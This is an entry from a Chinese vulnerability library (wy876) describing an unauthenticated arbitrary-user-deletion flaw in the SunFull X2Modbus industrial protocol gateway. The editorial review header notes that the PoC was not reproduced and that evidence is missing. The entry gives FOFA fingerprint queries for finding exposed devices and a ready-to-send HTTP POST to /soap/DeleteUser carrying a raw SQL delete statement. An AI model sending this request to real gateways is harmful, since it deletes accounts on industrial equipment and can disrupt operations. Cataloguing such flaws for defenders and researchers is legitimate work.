---
source: "wy876 漏洞文库"
id: "vw-f5769c676d977af92790786e"
entity_id: "ve-f5769c676d977af92790786e"
schema_version: "1"
fofa_unverified: "server="
title: "上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞"
product: "SunFull迅饶X2Modbus"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "只含语言Cookie，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96/%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中删除动作会改变或移除账户/文件，可能中断业务；只在有可恢复快照的隔离环境核对前后状态"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gqtttrccg5d19xuw"
source_status: "recorded"
---

# 上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：SunFull迅饶X2Modbus
- 本文讨论：soap/DeleteUser未授权操作/SQL直传线索
- 版本、权限与配置前提：只含语言Cookie，版本未知
- 资料类型：用户删除请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 删除前/后只剩标题，没有账户状态证据
- text/xml体实际SQL语句，需解释服务协议，不应擅称一般SQL注入
- FOFA元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中删除动作会改变或移除账户/文件，可能中断业务；只在有可恢复快照的隔离环境核对前后状态

### 待核与来源

- 服务是否执行该SQL及匿名删除权限待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞

# 二、影响版本
+ X2Modbus

# 三、资产测绘
+ fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
+ 特征


# 四、漏洞复现
删除前账号


```http
POST /soap/DeleteUser HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 39
Connection: close
Cookie: language=zh-cn; language=zh-cn

delete from userid where username='stc'
```


删除后


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gqtttrccg5d19xuw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
